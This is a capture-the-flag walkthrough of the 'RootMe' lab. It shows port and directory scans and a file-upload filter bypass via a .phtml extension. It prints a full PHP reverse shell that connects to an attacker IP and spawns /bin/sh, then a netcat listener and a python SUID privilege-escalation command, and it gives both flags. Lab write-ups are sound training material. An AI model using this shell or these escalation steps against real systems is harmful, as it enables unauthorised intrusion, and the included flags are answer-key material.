# RootMe

Question: 
`Scan the machine, how many ports are open?`

```sh
nmap -sV $ip                         

Nmap scan report for $ip
Host is up (0.084s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Answer: 
`2` Ports are open.

<br/>

Question:
`What version of Apache is running?`

Answer:
`2.4.29` is the correct Version.

<br/>

Question:
`What service is running on port 22?`

Answer:
`SSH` is the service which is also the default Port for SSH.

<br/>

Question:
`What is the hidden directory?`

```sh
ffuf -u http://$ip/FUZZ -w ../../webhacking/wordlists/directory_scanner/common.txt 
          ___     ___              ___
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://$ip/FUZZ
 :: Wordlist         : FUZZ: /home/kali/webhacking/wordlists/directory_scanner/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 2350ms]
    * FUZZ: .htpasswd

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3353ms]
    * FUZZ: .htaccess

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 3353ms]
    * FUZZ: .hta

[Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 69ms]
    * FUZZ: css

[Status: 200, Size: 616, Words: 115, Lines: 26, Duration: 79ms]
    * FUZZ: index.php

[Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 74ms]
    * FUZZ: js

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 69ms]
    * FUZZ: panel

[Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 71ms]
    * FUZZ: server-status

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 80ms]
    * FUZZ: uploads

:: Progress: [4613/4613] :: Job [1/1] :: 542 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

Answer:
`/panel/` seems to be the hidden directory.

<br/>

Question:
What is the content of `user.txt`?

To get this we need to get a reverse shell to the machine. For the reverse shell I used a simple PHP script but it seems that normal a `.php` file is blocked by the system. 
To bypass this we rename the `.php` file to `.phtml` which bypasses the security and let's us upload the reverse shell. 

Reverse Shell by PentestMonkey:
```php
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.0.0.1';  // Your IP
$port = 9999;       // Your PORT
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?> 
```

NetCat Listener for rev shell:
```sh
nc -lnvp 9999
``` 

Answer:
`THM{y0u_g0t_a_sh3ll}` seems to be the content for `user.txt`.

<br/>

Question:
Find a file with weird SUID permission:

For this we use a simple `find` command
```sh
find / -user root -perm /4000
```

Answer:
`/usr/bin/python` seems to be fun to play with.

<br/>

The next Step is to escalate priviledges which is not so hard because we found an exploit for this on https://gtfobins.github.io/gtfobins/python/.
```sh
python -c 'import os; os.execl("/bin/sh", "sh", "-p")’
```

Question:
What is the content of `root.txt`?

Answer:
`THM{pr1v1l3g3_3sc4l4t10n}` is the content of `root.txt`.

